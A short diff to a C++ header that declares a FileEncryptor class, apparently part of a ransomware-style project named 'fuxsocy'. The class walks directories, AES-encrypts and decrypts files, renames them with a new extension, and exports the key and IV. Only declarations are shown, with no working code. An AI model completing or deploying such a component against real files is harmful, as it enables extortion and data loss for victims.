@@ -12,23 +12,22 @@ extern "C" {
 
 class FileEncryptor {
  public:
-  FileEncryptor(const std::string& directory);
+  FileEncryptor();
+  FileEncryptor(const std::string& b64_iv, const std::string& b64_key);
   virtual ~FileEncryptor() = default;
 
-  std::vector<std::string> ListDirectory() const;
+  std::vector<std::string> ListDirectory(std::string directory) const;
   void Encrypt(const std::string& filename) const;
   void Decrypt(const std::string& filename) const;
   std::string Export() const; // export iv and key
 
  private:  
-  static std::string Base64Encode(const CryptoPP::byte* bytes);
   static std::string GetOriginalFilename(std::string filename);
   static bool FilenameEndsIn(const std::string& filename, const std::string& keyword);
-  static const std::string kNewExtension;
 
+  static const std::string kNewExtension;
   CryptoPP::byte iv_[CryptoPP::AES::DEFAULT_BLOCKSIZE];
   CryptoPP::byte key_[CryptoPP::AES::DEFAULT_KEYLENGTH];
-  std::string directory_;
 };
 
 #endif // FUXSOCY_FILE_ENCRYPTOR_H_
